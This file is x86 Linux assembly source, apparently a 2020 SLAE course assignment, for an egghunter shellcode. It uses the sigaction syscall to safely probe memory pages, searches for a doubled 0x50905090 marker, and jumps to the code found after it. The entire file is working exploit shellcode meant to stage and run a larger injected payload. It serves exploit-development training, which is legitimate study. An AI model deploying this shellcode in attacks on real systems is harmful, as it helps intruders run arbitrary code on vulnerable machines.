; John
;
; Egghunter Shellcode - Assignment 3
;
; SecurityTube Linux Assembler Expert (SLAE) 32-bit
;
; October 12, 2020


global _start

section .text

_start:

	; Below shellcode searches program address space for the egg
	; Once found, execution control is passed to egg location
	xor ecx, ecx					; initialize ecx = 0
PageUp:
	or cx, 0xfff					; cx = 0x0fff
Increment:
	inc ecx								; cx = 0x1000
	jnz Valid							; continue if ecx != 0
	inc ecx								; inc again to avoid segfault
Valid:
	push BYTE 0x43				; sigaction()
	pop eax								; eax = syscall 67
	int 0x80							; system call
	cmp al, 0xf2					; ZF = 1 if EFAULT returned
	jz PageUp							; increment PAGE_SIZE if EFAULT returned

	mov eax, 0x50905090		; eax = egg value
	mov edi, ecx					; load *act pointer into edi
	scasd									; ZF = 1 if eax = [edi]
	jnz Increment					; egg not found. keep searching
	scasd									; ZF = 1 if next DWORD = egg
	jnz Increment					; egg not found twice in a row. keep searching
	jmp edi								; eggs have been found. Jump to shellcode.
